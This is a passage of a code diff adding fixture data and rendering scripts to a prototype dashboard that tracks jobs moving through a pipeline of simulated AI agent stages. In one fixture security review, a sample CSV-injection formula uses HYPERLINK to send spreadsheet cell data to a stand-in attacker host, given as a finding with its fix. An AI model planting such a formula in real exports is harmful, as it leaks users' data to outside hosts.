+        { slug: 'job-prune', title: 'factory prune drops archived worktrees', after: ['job-archive'], job: '027-job-prune' },
+        { slug: 'settled-on-demand', title: 'Fetch settled jobs on demand', after: ['andon-reads-archive'], job: null },
+      ] },
+    { project: 'minerva', slug: 'tags-v2', title: 'Tags v2', target: 'main', started: 550, blocked: null,
+      members: [
+        { slug: 'tag-colors', title: 'Tag colors', after: [], job: '042-tag-colors' },
+        { slug: 'tag-rename', title: 'Rename a tag everywhere', after: [], job: '043-tag-rename' },
+        { slug: 'tag-hierarchy', title: 'Nested tags', after: ['tag-colors'], job: '044-tag-hierarchy' },
+        { slug: 'tag-filter-ui', title: 'Filter notes by tag subtree', after: ['tag-hierarchy'], job: null },
+        { slug: 'tag-suggestions', title: 'Suggest tags while typing', after: ['tag-rename', 'tag-filter-ui'], job: null },
+      ] },
+    { project: 'aegis', slug: 'admin-console', title: 'Admin console', target: 'main', started: 845,
+      blocked: { at: 29, reason: 'checkout is on feature-x',
+        note: 'Landing blocked: the aegis-v5 checkout is on feature-x, not main. Every member is merged into the epic branch and its gate is green; the epic lands on main with one merge once the checkout is back on main.' },
+      members: [
+        { slug: 'admin-shell', title: 'Admin console shell and nav', after: [], job: '114-admin-shell' },
+        { slug: 'admin-users', title: 'User management page', after: ['admin-shell'], job: '115-admin-users' },
+        { slug: 'admin-settings', title: 'Workspace settings page', after: ['admin-shell'], job: '116-admin-settings' },
+      ] },
+  ];
+
+  const SETTLE_MIN = 24 * 60;
+  for (const j of jobs) {
+    j.key = `${j.project}/${j.id}`;
+    j.branch = `factory/${j.id}`;
+    j.epic = j.epic ?? null; j.helper = j.helper ?? null;
+    j.target = j.epic ? `factory/epic/${j.epic}` : 'main';
+    j.history = j.history.map(([stage, m]) => ({ stage, at: ago(m) }));
+    j.rounds = j.rounds.map((r) => ({ round: r.round, at: ago(r.at),
+      reviews: Object.fromEntries(Object.entries(r.reviews).map(([k, [v, f]]) => [k, { verdict: v, finishedAt: f === null ? null : ago(f) }])) }));
+    j.enteredAt = j.history[j.history.length - 1].at; // when it entered its current stage
+    j.claimedAt = j.history[0].at;
+    const cur = j.rounds[j.rounds.length - 1];
+    const failed = cur !== undefined && Object.values(cur.reviews).some((r) => r.verdict === 'CHANGES');
+    // merged into an epic branch: not on the target yet, so it never settles
+    if (j.stage === 'merged') j.kind = !j.epic && NOW - j.enteredAt > SETTLE_MIN * 60000 ? 'settled' : 'merged';
+    else if (j.stage === 'review') j.kind = failed ? 'review-failed' : 'reviewing';
+    else j.kind = j.stage; // needs-human | approve | build | spec | claimed
+  }
+
+  // Derive each epic's live view from its member jobs.
+  for (const e of epics) {
+    e.key = `${e.project}/${e.slug}`;
+    e.branch = `factory/epic/${e.slug}`;
+    e.startedAt = ago(e.started);
+    if (e.blocked) e.blocked.at = ago(e.blocked.at);
+    const jobOf = (m) => (m.job ? jobs.find((j) => j.project === e.project && j.id === m.job) : null);
+    const bySlug = Object.fromEntries(e.members.map((m) => [m.slug, m]));
+    for (const m of e.members) m.jobKey = m.job ? `${e.project}/${m.job}` : null;
+    // queued (deps unmet or parallel cap) or blocked on <job> (a direct dependency escalated)
+    for (const m of e.members) {
+      const j = jobOf(m);
+      if (j) { m.state = j.kind === 'merged' ? 'merged' : j.kind === 'needs-human' ? 'needs-human' : 'running'; continue; }
+      const esc = m.after.map((s) => jobOf(bySlug[s])).find((dj) => dj && dj.kind === 'needs-human');
+      m.state = esc ? 'blocked' : 'queued';
+      m.blockedOn = esc ? esc.key : null;
+    }
+    e.helpers = jobs.filter((j) => j.project === e.project && j.epic === e.slug && j.helper).map((j) => j.key);
+    const memberJobs = e.members.map(jobOf).filter(Boolean);
+    const all = [...memberJobs, ...e.helpers.map((k) => jobs.find((j) => j.key === k))];
+    e.merged = e.members.filter((m) => m.state === 'merged').length;
+    e.running = all.filter((j) => !['merged', 'needs-human'].includes(j.kind)).length;
+    e.escalated = all.filter((j) => j.kind === 'needs-human').length;
+    e.queued = e.members.filter((m) => m.state === 'queued').length;
+    e.blockedMembers = e.members.filter((m) => m.state === 'blocked');
+    // running | waiting (epic-level: landing blocked) | stalled (a member needs you and nothing else can run) | landing | landed
+    e.state = e.blocked ? 'waiting' : e.merged === e.members.length ? 'landing' : e.escalated && !e.running ? 'stalled' : 'running';
+  }
+
+  window.FACTORY = {
+    NOW, projects, jobs, epics,
+    stages: ['claimed', 'spec', 'build', 'review', 'approve', 'merged'],
+    // The five working stations as the current board names them.
+    stations: [
+      { key: 'spec', name: 'Spec', who: 'spec-writer' },
+      { key: 'build', name: 'Build', who: 'builder' },
+      { key: 'review', name: 'Review', who: 'reviewers' },
+      { key: 'approve', name: 'Approve', who: 'approver' },
+      { key: 'merged', name: 'Merged', who: 'the line' },
+    ],
+    kinds: {
+      'needs-human': 'Escalated: needs a human',
+      'review-failed': 'Review failed (CHANGES)',
+      reviewing: 'In review',
+      approve: 'Awaiting approver',
+      build: 'Building',
+      spec: 'Writing spec',
+      claimed: 'Claimed',
+      merged: 'Merged (last 24h)',
+      settled: 'Settled (> 24h)',
+    },
+    ago: (t) => { const m = Math.round((NOW - t) / 60000); return m < 60 ? `${m}m` : m < 1440 ? `${Math.floor(m / 60)}h ${m % 60}m` : `${Math.floor(m / 1440)}d`; },
+  };
+})();
+
+</script>
+<script>
+// Shared drill-in fixture: each job's files (what the drawer lists) and its agent spans (what the
+// timing view shows), derived from data.js plus hand-written text for the jobs worth reading.
+// Load after data.js. Exposes FACTORY.docsFor(job), FACTORY.agentsFor(job), FACTORY.md(text).
+(function () {
+  const F = window.FACTORY;
+  const byKey = Object.fromEntries(F.jobs.map((j) => [j.key, j]));
+  const P = Object.fromEntries(F.projects.map((p) => [p.id, p]));
+  const at = (stage, j, nth = 0) => j.history.filter((h) => h.stage === stage)[nth]?.at ?? null;
+  const iso = (t) => new Date(t).toISOString().replace('T', ' ').slice(0, 16) + 'Z';
+
+  // Hand-written passages, keyed by job key then file name.
+  const custom = {
+    'minerva/040-tag-migration': {
+      'decision.md': `ESCALATE
+
+# Decision: 040-tag-migration
+
+All four reviewers passed round 1 and the gate is green, but I won't merge this.
+
+## Why it needs a human
+
+\`migrations/0031_tags_join.sql\` creates \`note_tags\` and then drops \`notes.tags\` in the same
+migration. Nothing copies the existing comma-separated tags into the join table first, so on
+any database with data, **every note loses its tags**. The tests start from an empty database,
+which is why the gate is green.
+
+The spec's acceptance criterion 4 says "existing tags survive the migration". The build claims
+it's met; it isn't.
+
+## Options
+
+- **rework**: add a backfill step (\`INSERT … SELECT\` over a split of \`notes.tags\`) before the
+  drop, plus a test that seeds tagged notes before migrating.
+- **approve**: only if no deployed database has tags yet.
+
+\`/factory rework 040-tag-migration "backfill before the drop"\``,
+      'build.md': `# Build: 040-tag-migration
+
+Branch \`factory/040-tag-migration\`, based on \`main\`.
+
+## What changed
+
+- \`migrations/0031_tags_join.sql\`: new \`note_tags(note_id, tag)\` table; drops \`notes.tags\`.
+- \`src/lib/notes/tags.ts\`: reads and writes through the join table.
+- \`src/lib/notes/tags.test.ts\`: 14 tests.
+
+## Acceptance criteria
+
+1. Tags are stored one row per tag. ✅
+2. Renaming a tag updates every note. ✅
+3. Tag queries use the index. ✅
+4. Existing tags survive the migration. ✅ (migration runs cleanly)
+
+## Gate
+
+\`bun test\` 212 pass · \`tsc --noEmit\` clean`,
+    },
+    'ledger/007-oauth-banks': {
+      'round-2/review-security.md': `VERDICT: CHANGES
+
+# Security review, round 2: 007-oauth-banks
+
+The round-1 finding is half fixed: the access token is no longer written to \`sync.log\`, but
+\`src/banks/oauth.ts:88\` still logs the **refresh token** in the error path when the exchange
+fails:
+
+\`\`\`ts
+log.error('token exchange failed', { body, refresh_token })
+\`\`\`
+
+A refresh token is long-lived and is worth more than the access token.
+
+## Required
+
+- Remove \`refresh_token\` from every log call, and redact \`body\` too (it can echo the token).
+- Add a test that fails if a token-shaped string reaches the logger.`,
+      'round-1/review-security.md': `VERDICT: CHANGES
+
+# Security review, round 1: 007-oauth-banks
+
+\`src/banks/sync.ts:41\` logs the full token response at info level, so access tokens end up in
+\`sync.log\`, which is shipped to the log collector.
+
+## Required
+
+- Never log token responses; log the status code and the bank id only.`,
+    },
+    'aegis/111-session-timeout': {
+      'decision.md': `APPROVE
+
+# Decision: 111-session-timeout
+
+Every reviewer passed, the gate is green, and the spec's five criteria are met. Merging.`,
+    },
+    'ledger/008-csv-import': {
+      'round-1/review-security.md': `VERDICT: CHANGES
+
+# Security review, round 1: 008-csv-import
+
+Imported descriptions are written back out unchanged by \`exportCsv\`. A description such as
+\`=HYPERLINK("https://evil.example?"&A1,"refund")\` becomes a live formula when the export is
+opened in a spreadsheet (CSV injection).
+
+## Required
+
+- Prefix any cell starting with \`=\`, \`+\`, \`-\`, \`@\`, tab or carriage return with \`'\` on export.
+- Test it with each of those leading characters.`,
+    },
+    'tinyjs/066-tray-menu': {
+      'round-1/review-ui.md': `VERDICT: CHANGES
+
+# UI review, round 1: 066-tray-menu
+
+Menu items built with \`{ disabled: true }\` still render enabled and still fire \`onClick\`.
+\`NSMenuItem.isEnabled\` is never set because \`autoenablesItems\` is left on.
+
+## Required
+
+- Set \`menu.autoenablesItems = false\` and map \`disabled\` to \`isEnabled\`.
+- Add a demo item that is disabled.`,
+    },
+    'minerva/044-tag-hierarchy': {
+      'decision.md': `ESCALATE
+
+# Decision: 044-tag-hierarchy
+
+Round 1 passed every review and the gate is green on \`factory/044-tag-hierarchy\`, but I won't
+merge it into \`factory/epic/tags-v2\`.
+
+## Why it needs a human
+
+\`setParent(tag, parent)\` never checks that \`parent\` isn't a descendant of \`tag\`. Making a tag
+its own ancestor is one drag away in the sidebar, and \`tagSubtree()\` then recurses until the
+request times out. The spec doesn't say whether a cycle should be refused or flattened, so this
+is a product call.
+
+## Effect on the epic
+
+\`tag-filter-ui\` is after \`tag-hierarchy\` and can't start; \`tag-suggestions\` waits on it in
+turn. Nothing else in the epic can run until this is resolved.
+
+## Options
+
+- **rework**: refuse a parent that is a descendant, with a test for the two-tag cycle.
+- **approve**: only if cycles are acceptable for now (they aren't reachable from the API).`,
+    },
+    'factory/028-sync-archive-record': {
+      'feature.md': `# Sync main into the epic branch
+
+_Generated by the factory for epic \`archive-record\`._
+
+Bringing \`main\` into \`factory/epic/archive-record\` conflicted after
+\`021-tinyjs-065-types\` landed on \`main\`:
+
+\`\`\`
+CONFLICT (content): Merge conflict in apps/andon/src/settled.ts
+\`\`\`
+
+Resolve the conflict on a branch off the epic branch, keep both sides' behavior, and leave the
+gate green. The result merges into the epic branch, not into \`main\`.`,
+      'build.md': `# Build: 028-sync-archive-record
+
+Branch \`factory/028-sync-archive-record\`, based on \`factory/epic/archive-record\`.
+
+## What changed
+
+- Merged \`main\` (7905ffe) into the branch.
+- \`apps/andon/src/settled.ts\`: kept the archive reader from \`025-job-archive\` and moved it onto
+  the Tiny JS 0.65 types from \`021\`.
+
+## Gate
+
+\`bun run test\` 418 pass · \`bun run check\` clean`,
+    },
+    'minerva/041-notes-search': {
+      'round-1/review-code.md': `VERDICT: CHANGES
+
+# Code review, round 1: 041-notes-search
+
+The FTS index is rebuilt on every keystroke in \`useSearch\`; with 5k notes that's ~300ms per
+key. Build the index once and update it from the note write path.`,
+    },
+  };
+
+  const featureText = (j) => `# ${j.title}
+
+${({ claimed: 'Queued from the backlog.', spec: 'Picked from the backlog.' })[j.stage] ?? 'From the backlog.'}
+
+${j.title}. Keep the change small and covered by tests; follow the project's conventions.`;
+
+  const specText = (j) => `# ${j.title}
+
+## Goal
+
+${j.title}, as described in the feature.
+
+## Acceptance criteria
+
+1. The behavior works end to end from the user's side.
+2. Errors are reported in one line, without a stack trace.
+3. Existing behavior is unchanged when the feature isn't used.
+4. Tests cover each criterion.
+
+## Out of scope
+
+Anything not needed for the criteria above.`;
+
+  const buildText = (j, round) => `# Build${round > 1 ? `, round ${round}` : ''}: ${j.id}
+
+Branch \`${j.branch}\`, based on \`${j.target}\`.
+
+## What changed
+
+- \`src/${j.id.replace(/^\d+-/, '').replace(/-/g, '_')}.ts\`: the feature.
+- \`src/${j.id.replace(/^\d+-/, '').replace(/-/g, '_')}.test.ts\`: tests for each criterion.
+${round > 1 ? '\n## Round ' + (round - 1) + ' findings\n\nAddressed every CHANGES finding; see the commit list.\n' : ''}
+## Gate
+
+\`bun test\` pass · \`tsc --noEmit\` clean`;
+
+  const reviewText = (j, k, round, verdict) => `VERDICT: ${verdict}
+
+# ${({ ui: 'UI', ux: 'UX' })[k] ?? k[0].toUpperCase() + k.slice(1)} review, round ${round}: ${j.id}
+
+${verdict === 'PASS' ? `Checked the diff against the spec under the ${k} rules. No findings.` : 'Findings below must be fixed before this can pass.'}`;
+
+  F.docsFor = (j) => {
+    const c = custom[j.key] ?? {};
+    const files = [];
+    const add = (path, text) => files.push({ path, text: c[path] ?? text });
+    add('feature.md', featureText(j));
+    if (at('spec', j) !== null && (j.stage !== 'spec')) add('spec.md', specText(j));
+    else if (j.stage === 'spec') add('spec.md', `# ${j.title}\n\n_The spec-writer is drafting this._`);
+    const builds = j.history.filter((h) => h.stage === 'build').length;
+    if (builds > 0 && !(j.stage === 'build' && builds === 1 && j.rounds.length === 0)) add('build.md', buildText(j, Math.max(1, j.rounds.length)));
+    for (const r of j.rounds) {
+      // in the order they were written, so the latest review is last
+      for (const [k, rv] of Object.entries(r.reviews).sort((a, b) => (a[1].finishedAt ?? Infinity) - (b[1].finishedAt ?? Infinity))) {
+        if (rv.verdict === 'pending') continue;
+        add(`round-${r.round}/review-${k}.md`, reviewText(j, k, r.round, rv.verdict));
+      }
+    }
+    if (j.decision !== null || at('needs-human', j) !== null && j.rounds.length > 0 && j.note.startsWith('approver'))
+      add('decision.md', `${j.decision ?? 'ESCALATE'}\n\n# Decision: ${j.id}\n\nAll reviews passed and the gate is green. Merging.`);
+    for (const path of Object.keys(c)) if (!files.some((f) => f.path === path)) files.push({ path, text: c[path] });
+    return files.map((f) => ({ ...f, verdict: (f.text.split('\n', 1)[0].match(/^(?:VERDICT:\s*)?(PASS|CHANGES|APPROVE|ESCALATE)\b/) ?? [])[1] ?? null }));
+  };
+
+  // Agent spans for the timing view: one per stage visit, reviewers inside each round.
+  F.agentsFor = (j) => {
+    const out = [];
+    const h = j.history;
+    for (let i = 0; i < h.length; i++) {
+      const s = h[i], end = h[i + 1]?.at ?? null;
+      const who = { spec: 'spec-writer', build: 'builder', approve: 'approver' }[s.stage];
+      if (who === undefined) continue;
+      const round = j.rounds.filter((r) => r.at <= s.at).length;
+      const verdict = who === 'approver' && end !== null ? (j.decision ?? (j.stage === 'needs-human' ? 'ESCALATE' : 'APPROVE')) : null;
+      out.push({ who, round: who === 'builder' ? Math.max(1, round + (round > 0 ? 1 : 0)) : round || null, started: s.at, ended: end, verdict });
+    }
+    for (const r of j.rounds) for (const [k, rv] of Object.entries(r.reviews))
+      out.push({ who: `reviewer · ${k}`, round: r.round, started: r.at + 60000, ended: rv.finishedAt, verdict: rv.verdict === 'pending' ? null : rv.verdict });
+    return out.sort((a, b) => a.started - b.started);
+  };
+
+  // Time per stage, for the timing bar and table.
+  F.stagesFor = (j) => j.history.map((s, i) => ({ stage: s.stage, entered: s.at, duration: (j.history[i + 1]?.at ?? (j.stage === 'merged' && i === j.history.length - 1 ? s.at : F.NOW)) - s.at }));
+
+  // ── epics: the plan file and the member briefs ──
+  const planIntro = {
+    'factory/archive-record': `Settled jobs stay in \`factory/jobs/\` forever, and every reader walks all of them: the
+backlog, \`doctor\`, and Andon's board. Move settled jobs into an archive record that readers
+skip unless they ask for it, and let Andon fetch settled jobs only when a view needs them.`,
+    'minerva/tags-v2': `Tags are a flat list with no color and no structure. Tags v2 gives them colors, a safe
+rename, nesting, a subtree filter, and suggestions while typing.`,
+    'aegis/admin-console': `One admin console for workspace owners: a shell with its own navigation, then user
+management and workspace settings as its first two pages.`,
+  };
+  const briefBody = {
+    'backlog-open-only': `\`factory next\` and \`backlog\` list only open jobs; settled and abandoned jobs are skipped
+without reading their logs.
+
+## Done when
+
+- \`factory backlog\` reads no settled job's \`log.jsonl\`.
+- A test with 200 settled jobs shows the backlog unchanged.`,
+    'job-archive': `Move a job's record into \`factory/jobs/archive/<id>/\` once it has settled, and keep a
+one-line entry per job in \`factory/jobs/archive/index.jsonl\`.
+
+## Done when
+
+- \`factory archive\` moves every settled job and is idempotent.
+- \`factory rebuild\` reads archived jobs on request (\`--archived\`).
+- The contract doc names the archive layout (additive within v1).`,
+    'andon-reads-archive': `The Andon service reads settled jobs from the archive index, not by walking job folders.
+
+## Done when
+
+- \`GET /projects/<pid>/settled\` is served from \`archive/index.jsonl\`.
+- The settled summary (\`count\`, \`lastMergedAt\`) comes from the index alone.`,
+    'job-prune': `\`factory prune\` removes worktrees and branches of archived jobs.
+
+## Done when
+
+- Prune removes only what an archived job left behind, and prints each removal.
+- \`--dry-run\` prints the plan and removes nothing.`,
+    'settled-on-demand': `Andon fetches a project's settled list only when a view needs it (the Settled sheet, a
+focused project, or a settled job in the inspector).
+
+## Done when
+
+- Connecting fetches only each project's settled summary.
+- Opening the Settled sheet fetches the lists it shows, once, and caches them.`,
+  };
+  const briefText = (e, m) => `# ${m.title}
+
+${m.after.length ? `after: ${m.after.map((a) => `\`${a}\``).join(', ')}` : 'after: none (can start first)'}
+
+${briefBody[m.slug] ?? `${m.title}. Keep the change small and covered by tests; follow the project's conventions.
+
+## Done when
+
+- The behavior works end to end from the user's side.
+- Tests cover each point above.`}`;
+  const planText = (e) => `# Epic: ${e.title}
+
+Branch \`${e.branch}\` → \`${e.target}\`
+
+${planIntro[e.key] ?? ''}
+
+## Members
+
+${e.members.map((m) => `- \`${m.slug}\` — ${m.title}.${m.after.length ? ` after: ${m.after.map((a) => `\`${a}\``).join(', ')}` : ''}`).join('\n')}
+
+## Landing
+
+Members run in parallel as their \`after:\` edges allow, at most 2 members
+at once (sync and fix jobs don't count). Each merges into
+\`${e.branch}\`. When every member has merged and the gate is green on the epic branch, the epic
+lands on \`${e.target}\` with one merge. A conflict bringing \`${e.target}\` in becomes a **sync** job;
+a red gate on the epic branch becomes a **fix** job.`;
+  F.epicDocs = (e) => [
+    { path: `factory/epics/${e.slug}.md`, label: `${e.slug}.md`, group: 'Plan', text: planText(e) },
+    ...e.members.map((m) => ({ path: `factory/epics/${e.slug}/${m.slug}.md`, label: `${m.slug}.md`, group: 'Member briefs', text: briefText(e, m) })),
+  ];
+
+  F.landing = (j) => `${j.branch} → ${j.target}`;
+  F.iso = iso;
+  F.dur = (ms) => { const m = Math.round(ms / 60000); return m < 60 ? `${m}m` : m < 1440 ? `${Math.floor(m / 60)}h ${m % 60}m` : `${Math.floor(m / 1440)}d ${Math.floor((m % 1440) / 60)}h`; };
+  F.byKey = byKey;
+  F.projectOf = (j) => P[j.project];
+
+  // A small markdown renderer: headings, paragraphs, lists, fenced code, inline code, bold, em.
+  F.md = (src) => {
+    const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    const inline = (s) => esc(s).replace(/`([^`]+)`/g, '<code>$1</code>').replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>').replace(/(^|\W)_([^_]+)_(?=\W|$)/g, '$1<em>$2</em>');
+    const out = []; let list = null, code = null, para = [];
+    const flush = () => { if (para.length) { out.push(`<p>${inline(para.join(' '))}</p>`); para = []; } if (list) { out.push(`<${list.t}>${list.items.map((x) => `<li>${inline(x)}</li>`).join('')}</${list.t}>`); list = null; } };
+    for (const line of src.split('\n')) {
+      if (code !== null) { if (line.startsWith('```')) { out.push(`<pre><code>${esc(code.join('\n'))}</code></pre>`); code = null; } else code.push(line); continue; }
+      if (line.startsWith('```')) { flush(); code = []; continue; }
+      const hm = line.match(/^(#{1,3})\s+(.*)/); if (hm) { flush(); out.push(`<h${hm[1].length}>${inline(hm[2])}</h${hm[1].length}>`); continue; }
+      const um = line.match(/^\s*[-*]\s+(.*)/); const om = line.match(/^\s*\d+\.\s+(.*)/);
+      if (um || om) { if (para.length) { out.push(`<p>${inline(para.join(' '))}</p>`); para = []; } const t = um ? 'ul' : 'ol'; if (!list || list.t !== t) { if (list) flush(); list = { t, items: [] }; } list.items.push((um ?? om)[1]); continue; }
+      if (line.trim() === '') { flush(); continue; }
+      if (list && /^\s{2,}/.test(line)) { list.items[list.items.length - 1] += ' ' + line.trim(); continue; }
+      if (/^(VERDICT: )?(PASS|CHANGES|APPROVE|ESCALATE)$/.test(line.trim()) && out.length === 0 && para.length === 0) { out.push(`<p class="verdict-line">${esc(line.trim())}</p>`); continue; }
+      para.push(line.trim());
+    }
+    flush();
+    return out.join('\n');
+  };
+})();
+
+</script>
+<script>
+
+// Andon render module: pure HTML builders shared by the overview and the inline panels.
+// makeAndon(F, S) → helpers. S is the view state (job, epic, file, project, needsMe, query).
+window.makeAndon = function (F, S) {
+  const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' })[c]);
+  const t0 = performance.now();
+  const now = () => F.NOW + (performance.now() - t0);
+  const ABBR = { security: 'se', contract: 'ct', code: 'cd', ui: 'ui', ux: 'ux' };
+  const ICON = {
+    flag: '<svg class="i" viewBox="0 0 16 16"><path d="M3.5 14V2.5M3.5 3h8l-1.8 3 1.8 3h-8"/></svg>',
+    merge: '<svg class="i" viewBox="0 0 16 16"><circle cx="4.5" cy="3.5" r="1.5"/><circle cx="4.5" cy="12.5" r="1.5"/><circle cx="11.5" cy="8" r="1.5"/><path d="M4.5 5v6M4.5 6c0 2 2 2 5.5 2"/></svg>',
+    epic: '<svg class="i" viewBox="0 0 16 16"><circle cx="4" cy="3" r="1.5"/><circle cx="4" cy="13" r="1.5"/><circle cx="12" cy="8" r="1.5"/><path d="M4 4.5v7M5.3 3.8C8.5 5 10.6 5.6 11 6.6M5.3 12.2C8.5 11 10.6 10.4 11 9.4"/></svg>',
+    seal: '<svg class="i" viewBox="0 0 16 16"><path d="m8 1.8 1.6 1.2 2-.1.6 1.9 1.6 1.2-.6 1.9.6 1.9-1.6 1.2-.6 1.9-2-.1L8 14.2l-1.6-1.2-2 .1-.6-1.9L2.2 10l.6-1.9-.6-1.9 1.6-1.2.6-1.9 2 .1z"/><path d="m5.8 8 1.5 1.5 3-3"/></svg>',
+    check: '<svg class="i" viewBox="0 0 16 16"><path d="m3.5 8.5 3 3 6-7"/></svg>',
+    doc: '<svg class="i" viewBox="0 0 16 16"><path d="M4 1.8h5l3 3v9.4H4z"/><path d="M9 1.8v3h3"/></svg>',
+    plan: '<svg class="i" viewBox="0 0 16 16"><path d="M4 1.8h5l3 3v9.4H4z"/><path d="M9 1.8v3h3M6 8h4M6 10.5h4"/></svg>',
+    clock: '<svg class="i" viewBox="0 0 16 16"><circle cx="8" cy="8" r="6"/><path d="M8 4.5V8l2.5 1.5"/></svg>',
+    copy: '<svg class="i" viewBox="0 0 16 16"><rect x="5.5" y="5.5" width="8" height="8" rx="1.5"/><path d="M10.5 5.5v-2a1 1 0 0 0-1-1h-6a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h2"/></svg>',
+    stack: '<svg class="i" viewBox="0 0 16 16"><path d="m8 2 6 3-6 3-6-3z"/><path d="m2 8 6 3 6-3M2 11l6 3 6-3"/></svg>',
+    chart: '<svg class="i" viewBox="0 0 16 16"><path d="M2.5 13.5h11M4.5 11V7M8 11V4M11.5 11V8.5"/></svg>',
+    close: '<svg class="i" viewBox="0 0 16 16"><path d="m4 4 8 8M12 4l-8 8"/></svg>',
+  };
+  const COLS = [{ key: 'andon', name: 'Andon', who: 'needs a human', kc: 'var(--red)' },
+    { key: 'spec', name: 'Spec', who: 'spec-writer', kc: 'var(--teal)' }, { key: 'build', name: 'Build', who: 'builder', kc: 'var(--indigo)' },
+    { key: 'review', name: 'Review', who: 'reviewers', kc: 'var(--purple)' }, { key: 'approve', name: 'Approve', who: 'approver', kc: 'var(--blue)' },
+    { key: 'merged', name: 'Merged', who: 'last 24 hours', kc: 'var(--green)' }];
+  const colOf = (j) => ({ 'needs-human': 'andon', claimed: 'spec', spec: 'spec', build: 'build', reviewing: 'review', 'review-failed': 'review', approve: 'approve', merged: 'merged', settled: 'merged' })[j.kind];
+  const isMF = (j) => j.kind === 'needs-human' && /^merge failed/.test(j.note);
+  const curRound = (j) => j.rounds[j.rounds.length - 1];
+  const sliver = (j) => (j.title === j.id ? j.id.replace(/^\d+-/, '') : j.title);
+  const num = (j) => j.id.slice(0, 3);
+  const P = Object.fromEntries(F.projects.map((p) => [p.id, p]));
+  const byKey = () => Object.fromEntries(F.jobs.map((j) => [j.key, j]));
+  const E = Object.fromEntries(F.epics.map((e) => [e.key, e]));
+  const epicOf = (j) => (j.epic ? E[`${j.project}/${j.epic}`] : null);
+  const KIND = { 'needs-human': 'Needs a human', 'review-failed': 'Review failed', reviewing: 'In review', approve: 'At approver', build: 'Building', spec: 'Writing spec', claimed: 'Claimed', merged: 'Merged', settled: 'Settled' };
+  const ESTATE = { running: 'Running', waiting: 'Waiting on you', stalled: 'Waiting on you', landing: 'Landing', landed: 'Landed' };
+  const EDOT = { running: 'active', waiting: 'hot', stalled: 'hot', landing: 'landing', landed: 'landed' };
+
+  // durations
+  const short = (ms) => { const m = Math.max(0, Math.floor(ms / 60000)); return m < 60 ? `${m}m` : m < 1440 ? `${Math.floor(m / 60)}h ${m % 60}m` : `${Math.floor(m / 1440)}d ${Math.floor((m % 1440) / 60)}h`; };
+  const clock = (ms) => { const s = Math.max(0, Math.floor(ms / 1000)); const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), x = s % 60; return `${h}:${String(m).padStart(2, '0')}:${String(x).padStart(2, '0')}`; };
+  // the largest unit only, floored: 42s, 45m, 1h, 2d (a merged token's time; lanes.ts shortAge)
+  const unit = (ms) => { const s = Math.max(0, Math.floor(ms / 1000)), m = Math.floor(s / 60); return s < 60 ? `${s}s` : m < 60 ? `${m}m` : m < 1440 ? `${Math.floor(m / 60)}h` : `${Math.floor(m / 1440)}d`; };
+  const fmtOf = (fmt) => (fmt === 'clock' ? clock : fmt === 'unit' ? unit : short);
+  const since = (t, fmt = 'short', suffix = '') => `<span data-since="${t}" data-fmt="${fmt}" data-suffix="${esc(suffix)}">${fmtOf(fmt)(now() - t)}${suffix}</span>`;
+  const hhmm = (t) => new Date(t).toISOString().slice(11, 16);
+  const dayhm = (t) => { const d = new Date(t); return `${d.toLocaleString('en-US', { month: 'short', day: 'numeric', timeZone: 'UTC' })}, ${hhmm(t)}`; };
+
+  // ── counts (trouble first: an epic waiting on you for an epic-level reason is one more item) ──
+  const epicHot = (e) => (e.state === 'waiting' ? 1 : 0);
+  const needsMe = (j) => j.kind === 'needs-human' || j.kind === 'review-failed';
+  const hotTotal = (pid = null) => F.jobs.filter((j) => (!pid || j.project === pid) && j.kind === 'needs-human').length + F.epics.filter((e) => !pid || e.project === pid).reduce((n, e) => n + epicHot(e), 0);
+  const needsMeTotal = () => F.jobs.filter(needsMe).length + F.epics.reduce((n, e) => n + epicHot(e), 0);
+
+  // ── lanes ────────────────────────────────────
+  // Sorted by trouble once per load, then held still so a moving job never makes its lane jump.
+  const order = { ids: null };
+  const isActive = (j) => j.kind !== 'merged' && j.kind !== 'settled';
+  const lanes = () => F.projects.map((p, idx) => {
+    const every = F.jobs.filter((j) => j.project === p.id);
+    const jobs = every.filter((j) => !j.epic); // the project lane keeps standalone jobs only
+    const epics = F.epics.filter((e) => e.project === p.id && e.state !== 'landed');
+    const active = jobs.filter(isActive);
+    const settled = jobs.filter((j) => j.kind === 'settled');
+    const merged = jobs.filter((j) => j.kind === 'merged');
+    const hot = jobs.filter((j) => j.kind === 'needs-human').length;
+    const failed = jobs.filter((j) => j.kind === 'review-failed').length;
+    const hotAll = hotTotal(p.id);
+    const failedAll = every.filter((j) => j.kind === 'review-failed').length;
+    const activeAll = every.filter(isActive);
+    const oldest = active.length ? Math.min(...active.map((j) => j.claimedAt)) : null;
+    const lastMerge = [...settled, ...merged].reduce((m, j) => Math.max(m, j.enteredAt), 0);
+    const dot = hotAll ? 'hot' : failedAll ? 'failed' : activeAll.length || epics.length ? 'active' : merged.length ? 'landed' : '';
+    return { p, idx, every, jobs, epics, active, activeAll, settled, merged, hot, failed, hotAll, failedAll, oldest, lastMerge, dot,
+      idle: activeAll.length === 0 && merged.length === 0 && epics.length === 0 };
+  }).sort((a, b) => (order.ids ? order.ids.indexOf(a.p.id) - order.ids.indexOf(b.p.id) : (a.idle - b.idle) || (b.hotAll - a.hotAll) || (b.failedAll - a.failedAll) || (b.activeAll.length - a.activeAll.length) || (a.idx - b.idx)));
+
+  // ── tokens ───────────────────────────────────
+  const verdicts = (j) => { const r = curRound(j); return r ? `<span class="vs">${Object.entries(r.reviews).map(([k, v]) => `<span class="v ${v.verdict}" title="${k}: ${v.verdict}">${ABBR[k] || k.slice(0, 2)}</span>`).join('')}</span>` : ''; };
+  const roundTag = (j) => (j.round > 0 ? `<span class="rd">R${j.round}/${j.maxRound}</span>` : '');
+  const token = (j) => {
+    const k = j.kind, sel = S.job === j.key ? ' sel' : '';
+    const ie = k === 'merged' && j.epic;
+    const htag = j.helper ? `<span class="htag" title="Generated ${j.helper} job">${j.helper}</span>` : '';
+    const head = `<span class="l1"><span class="num">${num(j)}</span><span class="sl">${esc(sliver(j))}</span></span>`;
+    const l3 = `<span class="l3">${esc(j.branch)}</span>`;
+    if (k === 'merged' || k === 'settled') {
+      // one line (Token.svelte): number, title, and the time since the merge in its largest unit, no "ago".
+      // A member merged into its epic branch adds an icon-only mark before the time.
+      const ep = ie ? epicOf(j) : null;
